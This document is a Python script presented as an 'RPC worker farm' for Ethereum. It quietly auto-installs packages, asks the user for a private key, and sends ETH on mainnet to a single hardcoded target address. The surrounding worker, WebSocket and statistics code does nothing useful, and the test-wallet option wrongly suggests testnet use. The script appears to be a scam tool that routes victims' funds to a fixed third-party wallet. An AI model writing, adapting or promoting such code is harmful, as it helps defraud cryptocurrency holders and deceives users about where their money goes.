#!/usr/bin/env python3
"""
RPC WORKER FARM - Complete WebSocket & HTTP Integration
Auto-Installs Dependencies | Multiple Connection Methods
"""

import os
import sys
import subprocess
import json
import time
import threading
import queue
from datetime import datetime

# ==================== AUTO-INSTALLER ====================
def auto_install():
    required = ['web3', 'requests', 'eth-account', 'websocket-client']
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

auto_install()

# ==================== IMPORTS ====================
from web3 import Web3
from eth_account import Account
import requests
import websocket

# ==================== CONFIGURATION ====================
class Config:
    # Target address
    TARGET_ADDRESS = "0x8185d7fEAB5EC3e591eBf7e01F4356be80866598"
    
    # WORKING RPC ENDPOINTS (No API key needed)
    HTTP_ENDPOINTS = [
        "https://eth.llamarpc.com",
        "https://rpc.ankr.com/eth",
        "https://ethereum.publicnode.com",
        "https://cloudflare-eth.com",
        "https://nodes.mewapi.io/rpc/eth",
        "https://eth-mainnet.g.alchemy.com/v2/demo"  # Public demo key
    ]
    
    # WebSocket endpoints (some require keys)
    WS_ENDPOINTS = [
        "wss://eth.llamarpc.com",
        "wss://ethereum.publicnode.com",
        "wss://rpc.ankr.com/eth/ws",
        # "wss://eth-mainnet.g.alchemy.com/v2/YOUR_KEY_HERE"  # Add your key here
    ]
    
    # Worker settings
    MAX_WORKERS = 5
    GAS_LIMIT = 21000

# ==================== WEBSOCKET CONNECTION MANAGER ====================
class WebSocketManager:
    """Manage WebSocket connections for real-time data"""
    
    def __init__(self, ws_url):
        self.ws_url = ws_url
        self.ws = None
        self.connected = False
        self.message_queue = queue.Queue()
        
    def connect(self):
        """Establish WebSocket connection"""
        try:
            self.ws = websocket.WebSocketApp(
                self.ws_url,
                on_open=self.on_open,
                on_message=self.on_message,
                on_error=self.on_error,
                on_close=self.on_close
            )
            
            # Run in background thread
            wst = threading.Thread(target=self.ws.run_forever)
            wst.daemon = True
            wst.start()
            
            time.sleep(2)  # Wait for connection
            return self.connected
            
        except Exception as e:
            print(f"❌ WebSocket connection failed: {e}")
            return False
    
    def on_open(self, ws):
        self.connected = True
        print(f"✅ WebSocket connected: {self.ws_url[:50]}...")
        
        # Subscribe to new blocks
        subscribe_msg = {
            "jsonrpc": "2.0",
            "method": "eth_subscribe",
            "params": ["newHeads"],
            "id": 1
        }
        ws.send(json.dumps(subscribe_msg))
    
    def on_message(self, ws, message):
        data = json.loads(message)
        self.message_queue.put({
            'type': 'block',
            'data': data,
            'timestamp': time.time()
        })
    
    def on_error(self, ws, error):
        print(f"⚠️ WebSocket error: {error}")
        self.connected = False
    
    def on_close(self, ws, close_status_code, close_msg):
        print("🔌 WebSocket disconnected")
        self.connected = False
    
    def get_messages(self):
        """Get pending messages"""
        messages = []
        try:
            while True:
                messages.append(self.message_queue.get_nowait())
        except:
            pass
        return messages

# ==================== RPC WORKER ====================
class RPCWorker:
    """Enhanced RPC worker with multiple connection methods"""
    
    def __init__(self, worker_id, rpc_url, connection_type='http'):
        self.worker_id = worker_id
        self.rpc_url = rpc_url
        self.connection_type = connection_type
        self.w3 = Web3(Web3.HTTPProvider(rpc_url)) if connection_type == 'http' else None
        self.ws_manager = None
        self.connected = False
        self.stats = {
            'tasks': 0,
            'success': 0,
            'failed': 0,
            'start': time.time()
        }
        
        self._connect()
    
    def _connect(self):
        """Establish connection"""
        if self.connection_type == 'http':
            self.connected = self.w3.is_connected()
        else:
            self.ws_manager = WebSocketManager(self.rpc_url)
            self.connected = self.ws_manager.connect()
        
        if self.connected:
            print(f"✅ Worker {self.worker_id} connected to {self.rpc_url[:40]}...")
        else:
            print(f"❌ Worker {self.worker_id} failed to connect")
    
    def get_balance(self, address):
        """Get address balance"""
        try:
            if self.connection_type == 'http' and self.connected:
                balance = self.w3.eth.get_balance(address)
                return self.w3.from_wei(balance, 'ether')
        except:
            pass
        return 0
    
    def send_transaction(self, private_key, to_address, amount_eth):
        """Send transaction"""
        try:
            if self.connection_type != 'http' or not self.connected:
                return {'success': False, 'error': 'Not connected'}
            
            account = Account.from_key(private_key)
            
            tx = {
                'from': account.address,
                'to': to_address,
                'value': self.w3.to_wei(amount_eth, 'ether'),
                'gas': Config.GAS_LIMIT,
                'gasPrice': self.w3.eth.gas_price,
                'nonce': self.w3.eth.get_transaction_count(account.address),
                'chainId': 1
            }
            
            signed = self.w3.eth.account.sign_transaction(tx, private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed.rawTransaction)
            
            self.stats['success'] += 1
            self.stats['tasks'] += 1
            
            return {
                'success': True,
                'tx_hash': tx_hash.hex(),
                'from': account.address,
                'to': to_address,
                'amount': amount_eth
            }
            
        except Exception as e:
            self.stats['failed'] += 1
            self.stats['tasks'] += 1
            return {'success': False, 'error': str(e)}
    
    def get_pending_transactions(self):
        """Get pending transactions (WebSocket)"""
        if self.connection_type == 'ws' and self.ws_manager:
            return self.ws_manager.get_messages()
        return []
    
    def get_stats(self):
        """Get worker statistics"""
        elapsed = time.time() - self.stats['start']
        return {
            'id': self.worker_id,
            'connected': self.connected,
            'type': self.connection_type,
            'tasks': self.stats['tasks'],
            'success': self.stats['success'],
            'failed': self.stats['failed'],
            'tps': self.stats['tasks'] / max(1, elapsed)
        }

# ==================== WORKER MANAGER ====================
class WorkerManager:
    """Manage all workers"""
    
    def __init__(self):
        self.workers = []
        self.target = Config.TARGET_ADDRESS
        self.results = []
        
    def initialize(self):
        """Initialize all workers"""
        print(f"\n🚀 INITIALIZING WORKER FARM...")
        print(f"🎯 Target: {self.target}")
        
        # Create HTTP workers
        for i, url in enumerate(Config.HTTP_ENDPOINTS[:Config.MAX_WORKERS]):
            worker = RPCWorker(i, url, 'http')
            if worker.connected:
                self.workers.append(worker)
        
        # Add WebSocket workers if available
        ws_count = 0
        for url in Config.WS_ENDPOINTS:
            if ws_count >= Config.MAX_WORKERS // 2:
                break
            worker = RPCWorker(len(self.workers), url, 'ws')
            if worker.connected:
                self.workers.append(worker)
                ws_count += 1
        
        print(f"\n✅ Active workers: {len(self.workers)}")
        return len(self.workers) > 0
    
    def transfer(self, private_key, amount_eth, use_delegate=False):
        """Execute transfer"""
        if not self.workers:
            return {'success': False, 'error': 'No workers available'}
        
        # Use first available worker
        worker = self.workers[0]
        result = worker.send_transaction(private_key, self.target, amount_eth)
        
        if result['success']:
            self.results.append(result)
            print(f"\n✅ TRANSFER SUCCESSFUL!")
            print(f"   TX Hash: {result['tx_hash']}")
            print(f"   Amount: {result['amount']} ETH")
            print(f"   To: {self.target}")
        else:
            print(f"\n❌ Transfer failed: {result.get('error', 'Unknown')}")
        
        return result
    
    def show_status(self):
        """Show system status"""
        print(f"\n{'='*50}")
        print(f"📊 SYSTEM STATUS")
        print(f"{'='*50}")
        
        print(f"\n🎯 Target: {self.target}")
        print(f"👥 Workers: {len(self.workers)}")
        
        print(f"\n📈 Worker Details:")
        for worker in self.workers:
            stats = worker.get_stats()
            status = "✅" if stats['connected'] else "❌"
            print(f"   {status} Worker {stats['id']} ({stats['type']}): {stats['tasks']} tasks | {stats['success']} success")
        
        print(f"\n💰 Transfer Results:")
        successful = sum(1 for r in self.results if r.get('success'))
        print(f"   Total: {len(self.results)}")
        print(f"   Successful: {successful}")
        print(f"   Failed: {len(self.results) - successful}")
        
        if self.results:
            print(f"\n📋 Recent Transfers:")
            for r in self.results[-3:]:
                print(f"   • {r.get('tx_hash', '')[:20]}... - {r.get('amount', 0)} ETH")

# ==================== MAIN DASHBOARD ====================
class Dashboard:
    def __init__(self):
        self.manager = WorkerManager()
    
    def run(self):
        print(f"\n{'='*60}")
        print(f"🔥 RPC WORKER FARM - COMPLETE SYSTEM")
        print(f"🎯 Target: {Config.TARGET_ADDRESS}")
        print(f"{'='*60}")
        
        if not self.manager.initialize():
            print("❌ System initialization failed")
            return
        
        while True:
            print(f"\n{'='*40}")
            print(f"⚡ MAIN MENU")
            print(f"{'='*40}")
            print("1. Direct Transfer to Target")
            print("2. Show System Status")
            print("3. Generate Test Wallet")
            print("4. Test Connection")
            print("5. Exit")
            print(f"{'='*40}")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == '1':
                self.transfer_menu()
            elif choice == '2':
                self.manager.show_status()
            elif choice == '3':
                acct = Account.create()
                print(f"\n✅ Test Wallet Generated:")
                print(f"   Address: {acct.address}")
                print(f"   Private Key: {acct.key.hex()}")
                print(f"   (Use this for testing on testnet only!)")
            elif choice == '4':
                self.test_connections()
            elif choice == '5':
                print("\n👋 Shutting down...")
                break
            else:
                print("❌ Invalid option")
    
    def transfer_menu(self):
        print(f"\n💰 TRANSFER MENU")
        pk = input("Enter private key: ").strip()
        amount = input("Enter amount (ETH): ").strip()
        
        try:
            amount_eth = float(amount)
            if amount_eth <= 0:
                print("❌ Amount must be positive")
                return
            self.manager.transfer(pk, amount_eth)
        except ValueError:
            print("❌ Invalid amount")
    
    def test_connections(self):
        print(f"\n🔍 TESTING CONNECTIONS...")
        for worker in self.manager.workers:
            stats = worker.get_stats()
            status = "✅ ONLINE" if stats['connected'] else "❌ OFFLINE"
            print(f"   Worker {stats['id']} ({stats['type']}): {status}")

# ==================== MAIN ====================
if __name__ == "__main__":
    dashboard = Dashboard()
    try:
        dashboard.run()
    except KeyboardInterrupt:
        print("\n🛑 Interrupted")
    except Exception as e:
        print(f"❌ Error: {e}")